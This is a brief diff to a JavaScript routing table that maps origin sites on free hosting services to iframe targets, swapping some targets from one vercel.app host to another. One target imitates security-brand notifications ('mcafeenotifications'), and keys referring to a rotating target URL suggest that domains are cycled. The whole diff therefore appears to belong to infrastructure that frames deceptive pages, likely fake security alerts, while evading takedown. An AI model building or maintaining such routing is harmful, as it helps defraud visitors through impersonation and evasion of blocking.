@@ -93,8 +93,8 @@ const ORIGIN_GROUPS = {
     "https://relaxed-pegasus-8e3b77.netlify.app": { method: "iframes3ap", target: "https://mcafeenotifications.onrender.com" },
   },
   dmc: {
-    "https://main.d2d7h6s2h011oz.amplifyapp.com": { method: "iframe", target: "https://i-rand.vercel.app", redisKey: "rotation:target_url" },
-    "https://main.d2f8uqjdeqtpz7.amplifyapp.com": { method: "iframe", target: "https://i-rand.vercel.app" },
+    "https://main.d2d7h6s2h011oz.amplifyapp.com": { method: "iframe", target: "https://j-rand.vercel.app", redisKey: "rotation:target_url" },
+    "https://main.d2f8uqjdeqtpz7.amplifyapp.com": { method: "iframe", target: "https://j-rand.vercel.app" },
     "https://cozy-kheer-cea1f9.netlify.app": { method: "iframe", target: "elegant-truffle-a0f9f7.netlify.app", redisKey: "rotation:target_url"  },
   },
   aomine: {
